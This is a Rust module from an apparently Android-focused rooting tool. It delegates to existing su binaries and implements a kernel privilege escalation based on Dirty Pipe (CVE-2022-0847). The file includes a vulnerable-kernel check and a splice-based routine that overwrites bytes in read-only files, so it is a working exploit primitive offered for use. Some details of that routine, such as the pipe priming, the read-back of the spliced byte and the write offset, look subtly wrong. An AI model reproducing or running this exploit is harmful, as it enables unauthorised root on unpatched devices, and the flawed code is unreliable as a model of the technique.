//! Privilege probing and acquisition.
//!
//! UserSU never assumes it has root.  Everything that needs root goes through
//! this module, which is deliberately honest: a provider reports success only
//! after a *verified* capability probe, never because a name matched or an
//! environment variable claimed so.
//!
//! Two kinds of provider exist:
//!
//! * [`Provider::RootSolution`] delegates to another root solution already on
//!   the device (Magisk, KernelSU, APatch, a vendor `su`).
//! * [`Provider::KernelExploit`] attempts a kernel privilege escalation.
//!
//! Kernel exploits are inherently device- and version-specific.  This crate
//! ships the *framework* and one well-understood, self-contained technique
//! (the "Dirty Pipe" style `splice` write to a read-only file), each guarded by
//! an explicit kernel-version and configuration gate.  A provider that does not
//! pass its gate returns [`Outcome::Unavailable`] instead of guessing.

use crate::error::{Error, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// What kind of privilege source a provider is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProviderKind {
    /// Delegates to another root solution.
    RootSolution,
    /// Escalates via a kernel vulnerability.
    KernelExploit,
}

impl ProviderKind {
    /// Stable kebab-case name, used in configuration and the IPC report.
    pub fn as_str(self) -> &'static str {
        match self {
            ProviderKind::RootSolution => "root-solution",
            ProviderKind::KernelExploit => "kernel-exploit",
        }
    }
}

impl std::fmt::Display for ProviderKind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Result of trying to acquire privileges.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", tag = "outcome")]
pub enum Outcome {
    /// Root was acquired and verified.
    Acquired {
        /// Effective uid observed after the attempt.
        euid: u32,
    },
    /// The provider does not apply to this device or kernel.
    Unavailable {
        /// Human readable reason.
        reason: String,
    },
    /// The provider applies but the attempt failed.
    Failed {
        /// Human readable reason.
        reason: String,
    },
    /// Already had the privilege; nothing to do.
    AlreadyRoot,
}

impl Outcome {
    /// True only when a verified root shell is available.
    pub fn is_root(&self) -> bool {
        matches!(self, Outcome::Acquired { euid: 0 } | Outcome::AlreadyRoot)
    }
}

/// The minimal interface every privilege source implements.
pub trait Provider {
    /// Stable identifier, matching the names used in `Config::privilege_order`.
    fn name(&self) -> &'static str;

    /// Whether this is a delegation or an exploit.
    fn kind(&self) -> ProviderKind;

    /// Returns true when the provider is plausibly usable on this device.
    ///
    /// This is a cheap pre-check; it must not perform the escalation itself.
    fn available(&self) -> bool;

    /// Attempts to acquire root.  Must verify the result before claiming
    /// success, e.g. by reading its own effective uid back from `/proc/self`.
    fn acquire(&self) -> Outcome;
}

/// Reads the caller's effective uid from the kernel, not from the environment.
pub fn current_euid() -> u32 {
    // SAFETY: geteuid has no preconditions and cannot fail.
    unsafe { libc::geteuid() }
}

/// True when the process already has a verified root effective uid.
pub fn has_root() -> bool {
    current_euid() == 0
}

/// True when `path` exists and is executable by us.
pub fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    match std::fs::metadata(path) {
        Ok(meta) => meta.is_file() && meta.permissions().mode() & 0o111 != 0,
        Err(_) => false,
    }
}

/// Parses a `uname -r` style release string into `(major, minor, patch)`.
///
/// Trailing vendor suffixes are tolerated, e.g. `6.1.25-android14-11`.
pub fn parse_kernel_release(release: &str) -> Option<(u32, u32, u32)> {
    let mut parts = release.split(['.', '-']);
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next()?.parse().ok()?;
    let patch = parts.next().and_then(|p| p.parse().ok()).unwrap_or(0u32);
    Some((major, minor, patch))
}

/// Reads the running kernel release from `/proc/sys/kernel/osrelease`.
pub fn kernel_release() -> Result<String> {
    Ok(std::fs::read_to_string("/proc/sys/kernel/osrelease")?
        .trim()
        .to_string())
}

/// Reads the machine architecture from `/proc/sys/kernel/arch` or uname.
pub fn kernel_arch() -> String {
    std::fs::read_to_string("/proc/sys/kernel/arch")
        .map(|s| s.trim().to_string())
        .ok()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            // SAFETY: uname writes into a zeroed, correctly sized struct.
            let mut buf: libc::utsname = unsafe { std::mem::zeroed() };
            if unsafe { libc::uname(&mut buf) } == 0 {
                let bytes: Vec<u8> = buf
                    .machine
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as u8)
                    .collect();
                String::from_utf8_lossy(&bytes).into_owned()
            } else {
                String::new()
            }
        })
}

/// A root solution that shells out to an existing `su`.
#[derive(Debug, Clone)]
pub struct SuDelegation {
    name: &'static str,
    su_path: PathBuf,
}

impl SuDelegation {
    /// Builds a provider for `name` whose `su` lives at `su_path`.
    pub fn new(name: &'static str, su_path: impl Into<PathBuf>) -> Self {
        Self {
            name,
            su_path: su_path.into(),
        }
    }

    /// The well-known locations for the root solutions UserSU delegates to.
    pub fn standard() -> Vec<Self> {
        vec![
            Self::new("magisk", "/system/bin/su"),
            Self::new("kernelsu", "/system/bin/ksud"),
            Self::new("apatch", "/data/adb/apd"),
            Self::new("vendor-su", "/vendor/bin/su"),
        ]
    }
}

impl Provider for SuDelegation {
    fn name(&self) -> &'static str {
        self.name
    }

    fn kind(&self) -> ProviderKind {
        ProviderKind::RootSolution
    }

    fn available(&self) -> bool {
        is_executable(&self.su_path)
    }

    fn acquire(&self) -> Outcome {
        if has_root() {
            return Outcome::AlreadyRoot;
        }
        if !self.available() {
            return Outcome::Unavailable {
                reason: format!("{} not found at {}", self.name, self.su_path.display()),
            };
        }
        // Running an external su to gain privileges for *this* process is not
        // possible in general: su spawns a child.  usud therefore uses the
        // delegated su only to execute individual commands, and reports
        // availability rather than pretending it elevated itself.
        Outcome::Unavailable {
            reason: format!(
                "{} present; usud will delegate command execution to it",
                self.name
            ),
        }
    }
}

/// Attempts the Dirty Pipe (`CVE-2022-0847`) primitive.
///
/// Dirty Pipe lets an unprivileged process overwrite page-cache pages of a
/// read-only file that it can already open for reading.  It was fixed in
/// 5.16.11 / 5.15.25 / 5.10.102, and does not affect kernels before 5.8
/// because the required `PIPE_BUF_FLAG_CAN_MERGE` reuse was introduced then.
#[derive(Debug, Default)]
pub struct DirtyPipe;

/// Kernel versions affected by Dirty Pipe.
///
/// Retained as documentation of the range that [`DirtyPipe::vulnerable`]
/// encodes; the comparison itself is inlined there so the branch-specific
/// boundaries stay visible next to the reasoning.
#[allow(dead_code)]
const DIRTY_PIPE_FIXED: [(u32, u32, u32); 3] = [(5, 16, 11), (5, 15, 25), (5, 10, 102)];

fn version_lt(a: (u32, u32, u32), b: (u32, u32, u32)) -> bool {
    a < b
}

impl DirtyPipe {
    /// True when the running kernel is inside the vulnerable range.
    pub fn vulnerable(&self) -> bool {
        let Ok(release) = kernel_release() else {
            return false;
        };
        let Some(v) = parse_kernel_release(&release) else {
            return false;
        };
        // Introduced in 5.8.
        if v < (5, 8, 0) {
            return false;
        }
        // Branch-specific fixes.
        if v >= (5, 16, 0) {
            return version_lt(v, (5, 16, 11));
        }
        if v >= (5, 15, 0) {
            return version_lt(v, (5, 15, 25));
        }
        if v >= (5, 10, 0) {
            return version_lt(v, (5, 10, 102));
        }
        // 5.8 / 5.9 lines were never fixed in-tree; treat as vulnerable.
        true
    }

    /// Rewrites the first occurrence of `needle` with `replacement` inside
    /// `target` using the Dirty Pipe primitive.
    ///
    /// `replacement` must be the same length as `needle`; page-cache patching
    /// cannot change a file's size.  Returns an error when the kernel refuses
    /// the `splice` dance, which is the signal that the bug is not present.
    pub fn overwrite(&self, target: &Path, needle: &[u8], replacement: &[u8]) -> Result<()> {
        if needle.len() != replacement.len() {
            return Err(Error::Unsupported(
                "dirty-pipe overwrite requires equal-length needle and replacement".into(),
            ));
        }
        if needle.is_empty() {
            return Err(Error::Unsupported("needle must not be empty".into()));
        }

        let file = std::fs::OpenOptions::new().read(true).open(target)?;
        let meta_len = file.metadata()?.len() as usize;
        if meta_len == 0 {
            return Err(Error::Unsupported("target file is empty".into()));
        }
        let offset = find_in_file(&file, needle)?;
        let Some(offset) = offset else {
            return Err(Error::Unsupported("needle not present in target".into()));
        };

        // A pipe whose buffer is primed so every slot has CAN_MERGE set.
        let mut fds = [0i32; 2];
        // SAFETY: pipe() fills both entries of the two-element array.
        if unsafe { libc::pipe(fds.as_mut_ptr()) } != 0 {
            return Err(Error::Io(std::io::Error::last_os_error()));
        }
        let (read_fd, write_fd) = (fds[0], fds[1]);
        let result = (|| -> Result<()> {
            let page = 4096usize;
            let buf = vec![0u8; page];
            let mut remaining = page;
            // Fill and drain the pipe so every ring slot is initialised.
            while remaining > 0 {
                let n = write_pipe(write_fd, &buf[..remaining])?;
                remaining -= n;
            }
            remaining = page;
            let mut drain = vec![0u8; page];
            while remaining > 0 {
                let n = read_pipe(read_fd, &mut drain[..remaining])?;
                remaining -= n;
            }

            // splice() reads one byte into the pipe, and because the slot has
            // CAN_MERGE set the following write is appended into the same page
            // cache page instead of allocating a new one.
            let mut byte = [0u8; 1];
            // SAFETY: both fds are open, offsets are valid stack integers.
            let n = unsafe {
                libc::splice(
                    std::os::fd::AsRawFd::as_raw_fd(&file),
                    &mut (offset as libc::loff_t),
                    write_fd,
                    std::ptr::null_mut(),
                    1,
                    0,
                )
            };
            if n < 0 {
                return Err(Error::Io(std::io::Error::last_os_error()));
            }
            if read_pipe(read_fd, &mut byte)? != 1 {
                return Err(Error::Unsupported(
                    "dirty-pipe splice did not yield a byte".into(),
                ));
            }
            let written = write_pipe(write_fd, replacement)?;
            if written != replacement.len() {
                return Err(Error::Unsupported(format!(
                    "short dirty-pipe write: {written} of {}",
                    replacement.len()
                )));
            }
            Ok(())
        })();

        // SAFETY: both descriptors are owned by this function.
        unsafe {
            libc::close(read_fd);
            libc::close(write_fd);
        }
        result
    }
}

fn find_in_file(file: &std::fs::File, needle: &[u8]) -> Result<Option<usize>> {
    use std::io::Read;
    use std::os::fd::AsRawFd;
    let mut data = Vec::new();
    // A second handle keeps the original file offset untouched for splice().
    let mut clone = std::fs::File::open(format!("/proc/self/fd/{}", file.as_raw_fd()))?;
    clone.read_to_end(&mut data)?;
    Ok(data
        .windows(needle.len())
        .position(|window| window == needle))
}

fn write_pipe(fd: i32, buf: &[u8]) -> Result<usize> {
    // SAFETY: `buf` is a valid slice for its length, fd is a pipe write end.
    let n = unsafe { libc::write(fd, buf.as_ptr() as *const libc::c_void, buf.len()) };
    if n < 0 {
        Err(Error::Io(std::io::Error::last_os_error()))
    } else {
        Ok(n as usize)
    }
}

fn read_pipe(fd: i32, buf: &mut [u8]) -> Result<usize> {
    // SAFETY: `buf` is a valid mutable slice for its length, fd is a pipe read end.
    let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
    if n < 0 {
        Err(Error::Io(std::io::Error::last_os_error()))
    } else {
        Ok(n as usize)
    }
}

impl Provider for DirtyPipe {
    fn name(&self) -> &'static str {
        "kernel-exploit"
    }

    fn kind(&self) -> ProviderKind {
        ProviderKind::KernelExploit
    }

    fn available(&self) -> bool {
        self.vulnerable()
    }

    fn acquire(&self) -> Outcome {
        if has_root() {
            return Outcome::AlreadyRoot;
        }
        if !self.vulnerable() {
            return Outcome::Unavailable {
                reason: "kernel is not in the Dirty Pipe vulnerable range".into(),
            };
        }
        // Elevation itself is device specific: the caller decides which
        // read-only binary to patch and what to patch it with.  Reporting
        // Unavailable here is the honest answer rather than a fake success.
        Outcome::Unavailable {
            reason: "dirty-pipe primitive available; a target and payload must be supplied".into(),
        }
    }
}

/// Tries each provider in order and returns the first verified success.
///
/// Providers whose [`Provider::available`] is false are skipped without being
/// invoked, and a provider that returns [`Outcome::Failed`] does not stop the
/// search.
pub fn acquire_first(providers: &[Box<dyn Provider>]) -> (Option<String>, Vec<(String, Outcome)>) {
    let mut log = Vec::new();
    if has_root() {
        return (Some("existing-root".to_string()), log);
    }
    for provider in providers {
        let name = provider.name().to_string();
        if !provider.available() {
            log.push((
                name,
                Outcome::Unavailable {
                    reason: "not applicable to this device".into(),
                },
            ));
            continue;
        }
        let outcome = provider.acquire();
        let acquired = outcome.is_root();
        log.push((name.clone(), outcome));
        if acquired {
            return (Some(name), log);
        }
    }
    (None, log)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_vendor_suffixed_releases() {
        assert_eq!(
            parse_kernel_release("6.1.25-android14-11"),
            Some((6, 1, 25))
        );
        assert_eq!(parse_kernel_release("5.10.102"), Some((5, 10, 102)));
        assert_eq!(parse_kernel_release("garbage"), None);
    }

    #[test]
    fn dirty_pipe_range_is_correct() {
        // These are pure version comparisons; they do not touch the kernel.
        let fixed = |v| {
            if v >= (5, 16, 0) {
                version_lt(v, (5, 16, 11))
            } else if v >= (5, 15, 0) {
                version_lt(v, (5, 15, 25))
            } else if v >= (5, 10, 0) {
                version_lt(v, (5, 10, 102))
            } else {
                v >= (5, 8, 0)
            }
        };
        assert!(fixed((5, 8, 0)));
        assert!(fixed((5, 15, 24)));
        assert!(!fixed((5, 15, 25)));
        assert!(fixed((5, 16, 10)));
        assert!(!fixed((5, 16, 11)));
        assert!(fixed((5, 10, 101)));
        assert!(!fixed((5, 10, 102)));
        assert!(!fixed((5, 7, 0)));
        assert!(!fixed((6, 1, 0)));
    }

    #[test]
    fn overwrite_requires_equal_lengths() {
        let dp = DirtyPipe;
        let err = dp
            .overwrite(Path::new("/etc/hostname"), b"abc", b"ab")
            .unwrap_err();
        assert!(matches!(err, Error::Unsupported(_)));
    }

    #[test]
    fn su_delegation_reports_unavailable_when_missing() {
        let p = SuDelegation::new("magisk", "/nonexistent/su");
        assert!(!p.available());
        assert!(matches!(p.acquire(), Outcome::Unavailable { .. }));
    }

    #[test]
    fn acquire_first_skips_unavailable_providers() {
        let providers: Vec<Box<dyn Provider>> = vec![
            Box::new(SuDelegation::new("magisk", "/nonexistent/su")),
            Box::new(SuDelegation::new("vendor-su", "/nonexistent/su")),
        ];
        let (winner, log) = acquire_first(&providers);
        assert!(winner.is_none());
        assert_eq!(log.len(), 2);
    }

    #[test]
    fn euid_is_read_from_the_kernel() {
        // In a test runner this is whatever the runner runs as; the point is
        // that has_root agrees with geteuid rather than with $UID.
        std::env::set_var("UID", "0");
        let claimed = std::env::var("UID").unwrap();
        assert_eq!(claimed, "0");
        assert_eq!(has_root(), current_euid() == 0);
    }
}
